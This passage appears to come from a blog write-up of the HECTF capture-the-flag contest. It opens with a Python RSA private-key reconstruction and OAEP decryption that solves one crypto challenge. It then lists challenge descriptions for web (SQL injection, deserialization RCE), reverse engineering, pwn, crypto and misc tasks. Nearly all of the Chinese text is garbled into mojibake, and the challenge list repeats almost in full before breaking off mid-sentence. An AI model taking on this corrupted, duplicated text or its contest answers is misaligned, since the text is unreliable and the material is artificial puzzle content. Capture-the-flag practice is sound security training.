16)</p><p>n = p * q</p><p>phi_n = (p - 1) * (q - 1)</p><p>d = inverse(e, phi_n)</p><p>rsa_key = RSA.construct((n, e, d, p, q))</p><p># ä½¿ç”¨ PKCS1_OAEP åˆå§‹åŒ–è§£å¯†å™¨<br> cipher = PKCS1_OAEP.new (rsa_key)</p><p># å°†å¯†æ–‡è½¬ä¸ºå­—èŠ‚å½¢å¼<br> ciphertext_bytes = long_to_bytesÂ©</p><p>decrypted_message_bytes = cipher.decrypt(ciphertext_bytes)<br># å°†è§£å¯†åçš„å­—èŠ‚æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä½¿ç”¨ UTF-8 è§£ç <br> message = decrypted_message_bytes.decode (â€˜utf-8â€™)<br>print(â€œDecrypted Message:â€, message)</p><p t1an_dog_no_g3t_g00d_d1e="">Decrypted Message: ä½ çŸ¥é“ä¹ˆï¼Œrsa çš„å¤§æ•°åˆ†è§£çš„åšå›ºå°±åƒçˆ±æƒ…ä¸€æ ·åšä¸å¯æ‘§ï¼Œä½ æ„¿æ„è®©æˆ‘ä»¬ä¹Ÿåƒ rsa ä¸€æ ·åšä¸å¯æ‘§ä¹ˆï¼Ÿä½†æ˜¯ä½ å¹¶ä¸å…³å¿ƒç»“å±€ï¼Œä½ åªå…³å¿ƒä½ çš„ flag:HECTF</p><h1 id="é¢˜ç›®æè¿°è®°å½•"><a class="markdownIt-Anchor" href="#é¢˜ç›®æè¿°è®°å½•">#</a> é¢˜ç›®æè¿°è®°å½•ï¼š</h1><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2">#</a> Webï¼š</h2><h3 id="are-u-happy"><a class="markdownIt-Anchor" href="#are-u-happy">#</a> <strong>Are u happy</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å¼€å§‹å¼€å¿ƒåœ°ç©è€å§ï¼</p></blockquote><h3 id="baby_sql-2"><a class="markdownIt-Anchor" href="#baby_sql-2">#</a> <strong>baby_sql</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den çš„å…¬å¸é‡Œæœ‰ä¸ªè®°å½•å‘˜å·¥æ‰“å¡çš„åå°ï¼Œåªæœ‰ admin æ‰èƒ½ç™»é™†ï¼Œä½†æ˜¯ï¼Œg01den å‘ç°ï¼Œæ¯æ¬¡å»å…¬å¸è§†å¯Ÿçš„æ—¶å€™å…¬å¸é‡Œçš„å‘˜å·¥æ€»æ•°å§‹ç»ˆå’Œæ‰“å¡äº†çš„å‘˜å·¥æ•°ç›®å¯¹ä¸ä¸Šï¼Œg01den æ€€ç–‘å…¬å¸é‡Œçš„æŸä½å‘˜å·¥åˆ©ç”¨äº†æ¼æ´ï¼Œäºæ˜¯ä»–åœ¨åå°ç¨‹åºé‡Œå¢åŠ äº†ä¸€äº› WAFï¼Œå¹¶ä¸”ä»–å¯¹ä»–è‡ªå·±çš„ WAF å¾ˆè‡ªä¿¡ï¼Œå¹¶æš—ç¤ºäº†é‚£ä½å‘˜å·¥ä»–åœ¨æ•°æ®åº“é‡Œæ”¾äº†ä¸€ä¸ªé‡è¦çš„ä¿¡æ¯ï¼ˆflagï¼‰ï¼Œèƒ½æ‹¿åˆ°è¿™ä¸ªä¿¡æ¯ï¼ˆflagï¼‰çš„äººå¹´ç»ˆå¯ä»¥è·å¾—é¢å¤–çš„å¥–é‡‘ã€‚ä½œä¸ºé‚£ä½å‘˜å·¥çš„ä½ åº”è¯¥å¦‚ä½•æ‹¿åˆ°è¿™ä¸ªä¿¡æ¯è·å¾—å¥–é‡‘å‘¢ï¼Ÿ flag ç”± HECTF å¼€å¤´ï¼Œå¾—åˆ°çš„ç­”æ¡ˆè¯·å°† hectf ä¿®æ”¹ä¸ºå¤§å†™ HECTFï¼Œflag ä¸­é™¤äº†å¼€å¤´çš„ HECTF å¤–ï¼Œæ— å¤§å†™å­—æ¯</p></blockquote><h3 id="baby_unserialize-2"><a class="markdownIt-Anchor" href="#baby_unserialize-2">#</a> <strong>baby_unserialize</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–ï¼Œä¸€ä¸ªç®€å•çš„ RCE</p></blockquote><h3 id="ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™-2"><a class="markdownIt-Anchor" href="#ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™-2">#</a> <strong>ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>w41tm00n ç¬¬ä¸€æ¬¡å­¦ä¹ å¼€å‘ç½‘ç«™ï¼Œè€æ¿è®©ä»–ä¸‰å¤©ä¹‹å†…æå®šã€‚ç¬¬äºŒå¤©ï¼Œw41tm00n ç»ˆäºå†™å®Œäº†ä»£ç ï¼Œå¹¶ä¸”è¿›è¡Œäº†è°ƒè¯•ï¼Œç½‘ç«™åœ¨æœåŠ¡å™¨ä¸Šèƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ w41tm00n æ²¡å­¦è¿‡ç½‘å®‰çš„çŸ¥è¯†ï¼Œå†™çš„ç½‘ç«™å­˜åœ¨æ¼æ´ä½ ä½œä¸º w41tm00n çš„å¥½æœ‹å‹ï¼ŒåŒæ—¶ä½ æ˜¯ä½ç½‘å®‰çš„å®ä¹ ç”Ÿï¼Œw41tm00n å°±æ‰¾åˆ°äº†ä½ å¸®ä»–æµ‹è¯•ç½‘ç«™æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚w41tm00n è·Ÿä½ è¯´ï¼Œä»–æ”¾äº†ä¸€ä¸ªçº¿ç´¢åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¦‚æœä½ æˆåŠŸå…¥ä¾µäº†è¿™ä¸ªæœåŠ¡å™¨çš„è¯å°±å¯ä»¥å¾—åˆ°è¿™ä¸ªç¤¼ç‰©çš„çº¿ç´¢ï¼ˆ/flag æ–‡ä»¶ï¼‰</p></blockquote><h3 id="ezweb-2"><a class="markdownIt-Anchor" href="#ezweb-2">#</a> <strong>ezweb</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Try to be admin to get flagï¼ï¼ï¼</p><p><strong>æç¤º 1</strong>Hintï¼šxxxxx ä¸º cã€eã€fã€hã€t è¿™äº”ä¸ªæ²¡å¤§æ²¡å°çš„å­—æ¯</p></blockquote><h3 id="ezjava-2"><a class="markdownIt-Anchor" href="#ezjava-2">#</a> ezjava</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>A äº†è¿™é“é¢˜ï¼Œæˆ‘å°±æ‰¿è®¤ä½ æ˜¯çœŸæ­£çš„å¥¶é¾™</p></blockquote><h2 id="re-2"><a class="markdownIt-Anchor" href="#re-2">#</a> Re</h2><h3 id="babyre-2"><a class="markdownIt-Anchor" href="#babyre-2">#</a> <strong>babyre</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den æœ€è¿‘å­¦ä¼šäº†ä¸€ä¸ªç®€å•çš„ç®—æ³•ï¼Œäºæ˜¯ä»–è¿«ä¸åŠå¾…çš„å†™ä¸‹äº†è¿™ä¸ªç¨‹åºã€‚åŒæ—¶ä»–åœ¨è¿™ä¸ªç¨‹åºé‡Œé¢è—äº†ä¸€äº›ç§˜å¯†ï¼Œä½ èƒ½å‘ç°ä»–è—åœ¨ç¨‹åºé‡Œé¢çš„ç§˜å¯†å—ï¼Ÿ</p></blockquote><h3 id="littleasm"><a class="markdownIt-Anchor" href="#littleasm">#</a> <strong>littleasm</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>ç™¾è¡Œä»£ç é‡Œçš„è—åŒ¿çš„ flag</p></blockquote><h3 id="pepy"><a class="markdownIt-Anchor" href="#pepy">#</a> <strong>PE?py?</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>åœ¨ pyre é‡Œæ‰¾åˆ°å‹ç¼©åŒ…å¯†ç </p></blockquote><h3 id="easyree"><a class="markdownIt-Anchor" href="#easyree">#</a> <strong>easyree</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote xxxx=""><p>flag æ ¼å¼ HECTF</p></blockquote><h3 id="ezandroid"><a class="markdownIt-Anchor" href="#ezandroid">#</a> <strong>ezAndroid</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2">#</a> Pwn</h2><h3 id="sign-in-2"><a class="markdownIt-Anchor" href="#sign-in-2">#</a> <strong>sign in</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å¿«æ¥ç­¾åˆ°å§â€¦</p></blockquote><h3 id="find-eggy-2"><a class="markdownIt-Anchor" href="#find-eggy-2">#</a> <strong>find eggy</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="arcaea_sorting-2"><a class="markdownIt-Anchor" href="#arcaea_sorting-2">#</a> <strong>Arcaea_Sorting</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>â€“ä¸ºä½•æˆ‘çš„çœ¼é‡Œå¸¸å«æ³ªæ°´ï¼Œå› ä¸ºæˆ‘çˆ±è¿™ libcï¼Œçˆ±å¾—æ·±æ²‰  (<em><sup>â–½</sup></em>)</p><p>å¬å¥½äº†ï¼š</p><p>XX æœˆ XX æ—¥ï¼Œg01den è‡ªåˆ¶çš„æŸ¥åˆ†ç³»ç»Ÿæ­£å¼å®Œå·¥ï¼Œæ¯ä¸ªéƒ¨ç½²äº†è¯¥ç³»ç»Ÿçš„æœåŠ¡å™¨éƒ½å°†ä¼šè¿æ¥ä¸€åœºæ¼©æ¶¡ï¼Œä¸ºè¿™äº›æœåŠ¡å™¨å¸¦æ¥å…¨æ–°çš„å±æœºã€‚</p><p>ä½ æ‰€è´­ä¹°çš„æœåŠ¡å™¨éƒ½å°†è¿æ¥é»‘å®¢çš„è¯•ç‚¼ï¼Œä½ æ‰€ç†Ÿæ‚‰çš„æœåŠ¡å™¨éƒ½å°†åŠ è¯¸æ ˆæº¢å‡ºçš„å†ç»ƒã€‚</p><p>è‡³æ­¤ï¼Œä¸€é”¤å®šéŸ³ã€‚</p><p>å°˜åŸƒï¼Œå·²ç„¶è½å®šã€‚</p><p>#HECTF #å¬å¥½äº† #éŸµå¾‹æºç‚¹</p></blockquote><h3 id="arcaea_sorting_revenge-2"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge-2">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den å¾—çŸ¥ä»–å†™çš„æŸ¥åˆ†å™¨å­˜åœ¨æ¼æ´ï¼Œä»–å®³æ€•åˆ°å¤§æ™šä¸Šç¡ä¸ç€ï¼Œç¬¬äºŒå¤©ä¸€æ—©ç«æ€¥ç«ç‡åœ°æŠŠç¨‹åºé‡å†™äº†ï¼Œä½†æ˜¯ä»–çªç„¶å‘ç°ä»–å­¦è‰ºä¸ç²¾ï¼Œçªç„¶ä¸ä¼šå†™é“¾è¡¨æ•°æ®ç»“æ„äº†ï¼Œäºæ˜¯ï¼Œä»–å°†æŸ¥åˆ†å™¨æ”¹æˆäº†å­˜å‚¨åˆ†æ•°çš„å­˜å‚¨å™¨ï¼Œå¸Œæœ›è¿™æ¬¡ä¸ä¼šå‡ºç°å®‰å…¨æ€§é—®é¢˜ã€‚</p></blockquote><h3 id="å–µå–µå–µ"><a class="markdownIt-Anchor" href="#å–µå–µå–µ">#</a> <strong>å–µå–µå–µ</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="lip"><a class="markdownIt-Anchor" href="#lip">#</a> <strong>lip</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2">#</a> Crypto</h2><h3 id="è¿·èŒ«çš„è‰¾ç±³è‰-2"><a class="markdownIt-Anchor" href="#è¿·èŒ«çš„è‰¾ç±³è‰-2">#</a> <strong>è¿·èŒ«çš„è‰¾ç±³è‰</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>é¢˜ç›®æè¿°ï¼šè¿·èŒ«çš„è‰¾ç±³è‰ æè¿°ï¼šåœ¨ç»´å‰å°¼äºšå°é•‡ï¼Œå›­ä¸è‰¾ç±³è‰çš„ responsibility æ˜¯ç…§é¡¾ä¸€åº§å¤è€èŠ±å›­ï¼Œæ¯å¤©ä¿®å‰ªå…­æ®µç»¿ç¯±æ …æ ã€‚ä¸€å¤©ï¼Œå¥¹ å‘ç°é€šå¾€ç§˜å¯†èŠ±å›­çš„å°å¾„ï¼Œå…¥å£å´è¢«å°ä¸Šäº†ï¼Œä¸Šé¢æœ‰ä¸€ä¸²å¯†æ–‡ Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lrï¼Œè¯·è¾“å…¥å¯†ç å¸®åŠ©è‰¾ç±³è‰æ¢ç´¢ç§˜å¯†èŠ±å›­</p></blockquote><h3 id="ç¿»ä¸€ç¿»-2"><a class="markdownIt-Anchor" href="#ç¿»ä¸€ç¿»-2">#</a> <strong>ç¿»ä¸€ç¿»</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å°æ˜æœ€è¿‘å¤±æ‹äº†ï¼Œç¿»æ¥è¦†å»ç¡ä¸ç€ï¼Œè¯·å¸®ä»–æ‰¾å‡ºå¤±æ‹çš„å…³é”®ä¿¡æ¯</p></blockquote><h3 id="seven-more-2"><a class="markdownIt-Anchor" href="#seven-more-2">#</a> <strong>seven more</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>more than more no co-prime</p></blockquote><h3 id="æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦-2"><a class="markdownIt-Anchor" href="#æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦-2">#</a> <strong>æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å°æ˜å–œæ¬¢ä¸Šäº†å°çº¢ï¼Œä»–ä½¿ç”¨ rsa å‘å°çº¢å‘é€äº†æ— æ•°å°å«æœ‰ä¸­æ–‡å­—ç¬¦çš„æƒ…ä¹¦ã€‚ç»ˆäºå°çº¢å¿ä¸ä½äº†ï¼Œæ‰¾åˆ°äº†å¤§å˜¿é˜”å°†å°æ˜çš„ç§é’¥è¯ä¹¦æ‰“æˆç¢ç‰‡ï¼Œç§»é™¤äº†ä¸­é—´çš„å†…å®¹å¹¶æŠŠä¸Šä¸‹æ®µçš„ç§é’¥éƒ¨åˆ†è½¬åŒ–æˆ 16 è¿›åˆ¶ï¼Œä»¥ä¹ä¸ªä¸ºä¸€ç»„ç”¨ç›¸åŒçš„æ–¹å¼æ‰“ä¹±ï¼ˆè½¬åŒ–æ—¶äº§ç”Ÿçš„ 0d0a æ¢è¡Œç¬¦å·²è¢«ç§»é™¤ï¼‰ã€‚ä½œä¸ºå¯†ç å­¦å¤§ä½¬çš„ä½ èƒ½æ¢å¤è¯ä¹¦ï¼Œæ‰¾å‡ºå°çº¢å¿æ— å¯å¿çš„è¯æ®ä¹ˆï¼Ÿ</p><p><strong>æç¤º 1</strong> æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦ hint1: å­—ç¬¦ä¸­å«æœ‰ä¸­æ–‡ å¸¸è§„è¾“å‡ºæ–¹æ³•æ— æ•ˆï¼Œè¯·ä½¿ç”¨ PKCS1_OAEP è§£å¯†å™¨ï¼Œå¹¶ä½¿ç”¨ cipher.decrypt () è§£å¯†å¯†æ–‡ï¼ˆæ¯•ç«Ÿè€ƒç‚¹æ˜¯è¯ä¹¦ï¼‰</p></blockquote><h3 id="ä¸åˆæ ¼çš„é­”è¯-2"><a class="markdownIt-Anchor" href="#ä¸åˆæ ¼çš„é­”è¯-2">#</a> <strong>ä¸åˆæ ¼çš„é­”è¯</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>åˆšå¼€å§‹å­¦ä¹ é­”è¯çš„å° A æ€»æ˜¯åªå…³æ³¨é­”è¯çš„é¢œè‰²è€Œå¿½ç•¥é…æ¯”ï¼Œè¿™æ¬¡ä»–é…ç½®çš„é­”è¯åˆæ˜¯è¿™æ ·ï¼Œè¿™æ ·ä¸€ä»½ä¸åˆæ ¼çš„é­”è¯å®Œå…¨æ²¡åŠæ³•è¾¾åˆ°å¯¹ä¿¡æ¯ â€œä¿å¯†â€ çš„æ•ˆæœäº†ï¼Œè¯·ä»è¿™ä»½é¢ç›®å…¨éçš„æˆå“ä¸­è¿˜åŸå‡ºå° A æƒ³éšè—çš„ä¿¡æ¯</p></blockquote><h2 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2">#</a> Misc</h2><h3 id="rem_you"><a class="markdownIt-Anchor" href="#rem_you">#</a> <strong>Rem_You</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="funny"><a class="markdownIt-Anchor" href="#funny">#</a> <strong>funny</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote çœ-å¸‚-å¹¿åœºåå­—-æ°´è¾¹åå­—=""><p>çœ‹äº†åŠå¤©ç”µè„‘çš„å°æ˜éå¸¸åŠ³ç´¯ï¼Œä¾¿æ‘¸é±¼å»æ¥¼ä¸‹çš„å¹¿åœºé€›ä¸€é€›ä½†è§‰å¾—å¹¿åœºå¤ªåµé—¹äº†ï¼Œåˆå»äº†æ°´è¾¹çœ‹å¤§çˆ·ä»¬é’“é±¼ï¼Œä½ èƒ½æ‰¾å‡ºå°æ˜å»çš„å¹¿åœºå’Œæ°´è¾¹çš„åå­—å˜›</p><p>flag æ ¼å¼  HECTF {åŒ—äº¬å¸‚ - åŒº - å¹¿åœºåå­— - æ°´è¾¹åå­—}   HECTF</p></blockquote><h3 id="ç®€å•çš„å‹ç¼©åŒ…-2"><a class="markdownIt-Anchor" href="#ç®€å•çš„å‹ç¼©åŒ…-2">#</a> <strong>ç®€å•çš„å‹ç¼©åŒ…</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>w41tm00n æ˜¯ä¸ª kisaki æ¨ï¼ŒæŸå¤©åœ¨æ°´ç¾¤çš„æ—¶å€™ï¼Œä¸€ä¸ªåŒä¸º kisaki æ¨çš„ g01den åœ¨ç¾¤é‡Œåˆ†äº«äº†ä¸ªå‹ç¼©åŒ…ï¼Œå¹¶ç•™è¨€é‡Œé¢æœ‰ä¸€å¼  kisaki çš„å›¾ï¼ŒåŒæ—¶é‡Œé¢è¿˜å­˜åœ¨ç€ç¥ç§˜çš„ä¿¡æ¯ï¼ˆè¿™é‡Œæ˜¯ flagï¼‰ï¼Œw41tm00n å¯¹æ­¤å¾ˆæ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥å¸®ä»–å¾—åˆ°ç¥ç§˜çš„ä¿¡æ¯ï¼ˆflagï¼‰å—ï¼Ÿ</p></blockquote><h3 id="æ¶åŠ¿åŠ›çš„ä»“åº“"><a class="markdownIt-Anchor" href="#æ¶åŠ¿åŠ›çš„ä»“åº“">#</a> <strong>æ¶åŠ¿åŠ›çš„ä»“åº“</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>æ¶åŠ¿åŠ›çš„ä»“åº“æƒ¨é­æ¯’æ‰‹ï¼Œå°±ä»£è¡¨ç€æ¯’æ‰‹ä¼¸è¿›äº†æ¶åŠ¿åŠ›çš„ä»“åº“</p></blockquote><h3 id="æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•"><a class="markdownIt-Anchor" href="#æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•">#</a> <strong>æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>é™„ä»¶ä¸‹è½½åœ°å€ï¼š é“¾æ¥ï¼š<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  æå–ç ï¼šo07y</p></blockquote><p>ç­”æ¡ˆè¯·å°† hectf ä¿®æ”¹ä¸ºå¤§å†™ HECTFï¼Œflag ä¸­é™¤äº†å¼€å¤´çš„ HECTF å¤–ï¼Œæ— å¤§å†™å­—æ¯</p><h3 id="baby_unserialize-3"><a class="markdownIt-Anchor" href="#baby_unserialize-3">#</a> <strong>baby_unserialize</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–ï¼Œä¸€ä¸ªç®€å•çš„ RCE</p></blockquote><h3 id="ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™-3"><a class="markdownIt-Anchor" href="#ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™-3">#</a> <strong>ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>w41tm00n ç¬¬ä¸€æ¬¡å­¦ä¹ å¼€å‘ç½‘ç«™ï¼Œè€æ¿è®©ä»–ä¸‰å¤©ä¹‹å†…æå®šã€‚ç¬¬äºŒå¤©ï¼Œw41tm00n ç»ˆäºå†™å®Œäº†ä»£ç ï¼Œå¹¶ä¸”è¿›è¡Œäº†è°ƒè¯•ï¼Œç½‘ç«™åœ¨æœåŠ¡å™¨ä¸Šèƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ w41tm00n æ²¡å­¦è¿‡ç½‘å®‰çš„çŸ¥è¯†ï¼Œå†™çš„ç½‘ç«™å­˜åœ¨æ¼æ´ä½ ä½œä¸º w41tm00n çš„å¥½æœ‹å‹ï¼ŒåŒæ—¶ä½ æ˜¯ä½ç½‘å®‰çš„å®ä¹ ç”Ÿï¼Œw41tm00n å°±æ‰¾åˆ°äº†ä½ å¸®ä»–æµ‹è¯•ç½‘ç«™æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚w41tm00n è·Ÿä½ è¯´ï¼Œä»–æ”¾äº†ä¸€ä¸ªçº¿ç´¢åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¦‚æœä½ æˆåŠŸå…¥ä¾µäº†è¿™ä¸ªæœåŠ¡å™¨çš„è¯å°±å¯ä»¥å¾—åˆ°è¿™ä¸ªç¤¼ç‰©çš„çº¿ç´¢ï¼ˆ/flag æ–‡ä»¶ï¼‰</p></blockquote><h3 id="ezweb-3"><a class="markdownIt-Anchor" href="#ezweb-3">#</a> <strong>ezweb</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Try to be admin to get flagï¼ï¼ï¼</p><p><strong>æç¤º 1</strong>Hintï¼šxxxxx ä¸º cã€eã€fã€hã€t è¿™äº”ä¸ªæ²¡å¤§æ²¡å°çš„å­—æ¯</p></blockquote><h3 id="ezjava-3"><a class="markdownIt-Anchor" href="#ezjava-3">#</a> ezjava</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>A äº†è¿™é“é¢˜ï¼Œæˆ‘å°±æ‰¿è®¤ä½ æ˜¯çœŸæ­£çš„å¥¶é¾™</p></blockquote><h2 id="re-3"><a class="markdownIt-Anchor" href="#re-3">#</a> Re</h2><h3 id="babyre-3"><a class="markdownIt-Anchor" href="#babyre-3">#</a> <strong>babyre</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den æœ€è¿‘å­¦ä¼šäº†ä¸€ä¸ªç®€å•çš„ç®—æ³•ï¼Œäºæ˜¯ä»–è¿«ä¸åŠå¾…çš„å†™ä¸‹äº†è¿™ä¸ªç¨‹åºã€‚åŒæ—¶ä»–åœ¨è¿™ä¸ªç¨‹åºé‡Œé¢è—äº†ä¸€äº›ç§˜å¯†ï¼Œä½ èƒ½å‘ç°ä»–è—åœ¨ç¨‹åºé‡Œé¢çš„ç§˜å¯†å—ï¼Ÿ</p></blockquote><h3 id="littleasm-2"><a class="markdownIt-Anchor" href="#littleasm-2">#</a> <strong>littleasm</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>ç™¾è¡Œä»£ç é‡Œçš„è—åŒ¿çš„ flag</p></blockquote><h3 id="pepy-2"><a class="markdownIt-Anchor" href="#pepy-2">#</a> <strong>PE?py?</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>åœ¨ pyre é‡Œæ‰¾åˆ°å‹ç¼©åŒ…å¯†ç </p></blockquote><h3 id="easyree-2"><a class="markdownIt-Anchor" href="#easyree-2">#</a> <strong>easyree</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote xxxx=""><p>flag æ ¼å¼ HECTF</p></blockquote><h3 id="ezandroid-2"><a class="markdownIt-Anchor" href="#ezandroid-2">#</a> <strong>ezAndroid</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h2 id="pwn-3"><a class="markdownIt-Anchor" href="#pwn-3">#</a> Pwn</h2><h3 id="sign-in-3"><a class="markdownIt-Anchor" href="#sign-in-3">#</a> <strong>sign in</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å¿«æ¥ç­¾åˆ°å§â€¦</p></blockquote><h3 id="find-eggy-3"><a class="markdownIt-Anchor" href="#find-eggy-3">#</a> <strong>find eggy</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="arcaea_sorting-3"><a class="markdownIt-Anchor" href="#arcaea_sorting-3">#</a> <strong>Arcaea_Sorting</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>â€“ä¸ºä½•æˆ‘çš„çœ¼é‡Œå¸¸å«æ³ªæ°´ï¼Œå› ä¸ºæˆ‘çˆ±è¿™ libcï¼Œçˆ±å¾—æ·±æ²‰  (<em><sup>â–½</sup></em>)</p><p>å¬å¥½äº†ï¼š</p><p>XX æœˆ XX æ—¥ï¼Œg01den è‡ªåˆ¶çš„æŸ¥åˆ†ç³»ç»Ÿæ­£å¼å®Œå·¥ï¼Œæ¯ä¸ªéƒ¨ç½²äº†è¯¥ç³»ç»Ÿçš„æœåŠ¡å™¨éƒ½å°†ä¼šè¿æ¥ä¸€åœºæ¼©æ¶¡ï¼Œä¸ºè¿™äº›æœåŠ¡å™¨å¸¦æ¥å…¨æ–°çš„å±æœºã€‚</p><p>ä½ æ‰€è´­ä¹°çš„æœåŠ¡å™¨éƒ½å°†è¿æ¥é»‘å®¢çš„è¯•ç‚¼ï¼Œä½ æ‰€ç†Ÿæ‚‰çš„æœåŠ¡å™¨éƒ½å°†åŠ è¯¸æ ˆæº¢å‡ºçš„å†ç»ƒã€‚</p><p>è‡³æ­¤ï¼Œä¸€é”¤å®šéŸ³ã€‚</p><p>å°˜åŸƒï¼Œå·²ç„¶è½å®šã€‚</p><p>#HECTF #å¬å¥½äº† #éŸµå¾‹æºç‚¹</p></blockquote><h3 id="arcaea_sorting_revenge-3"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge-3">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den å¾—çŸ¥ä»–å†™çš„æŸ¥åˆ†å™¨å­˜åœ¨æ¼æ´ï¼Œä»–å®³æ€•åˆ°å¤§æ™šä¸Šç¡ä¸ç€ï¼Œç¬¬äºŒå¤©ä¸€æ—©ç«æ€¥ç«ç‡åœ°æŠŠç¨‹åºé‡å†™äº†ï¼Œä½†æ˜¯ä»–çªç„¶å‘ç°ä»–å­¦è‰ºä¸ç²¾ï¼Œçªç„¶ä¸ä¼šå†™é“¾è¡¨æ•°æ®ç»“æ„äº†ï¼Œäºæ˜¯ï¼Œä»–å°†æŸ¥åˆ†å™¨æ”¹æˆäº†å­˜å‚¨åˆ†æ•°çš„å­˜å‚¨å™¨ï¼Œå¸Œæœ›è¿™æ¬¡ä¸ä¼šå‡ºç°å®‰å…¨æ€§é—®é¢˜ã€‚</p></blockquote><h3 id="å–µå–µå–µ-2"><a class="markdownIt-Anchor" href="#å–µå–µå–µ-2">#</a> <strong>å–µå–µå–µ</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="lip-2"><a class="markdownIt-Anchor" href="#lip-2">#</a> <strong>lip</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h2 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3">#</a> Crypto</h2><h3 id="è¿·èŒ«çš„è‰¾ç±³è‰-3"><a class="markdownIt-Anchor" href="#è¿·èŒ«çš„è‰¾ç±³è‰-3">#</a> <strong>è¿·èŒ«çš„è‰¾ç±³è‰</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>é¢˜ç›®æè¿°ï¼šè¿·èŒ«çš„è‰¾ç±³è‰ æè¿°ï¼šåœ¨ç»´å‰å°¼äºšå°é•‡ï¼Œå›­ä¸è‰¾ç±³è‰çš„ responsibility æ˜¯ç…§é¡¾ä¸€åº§å¤è€èŠ±å›­ï¼Œæ¯å¤©ä¿®å‰ªå…­æ®µç»¿ç¯±æ …æ ã€‚ä¸€å¤©ï¼Œå¥¹ 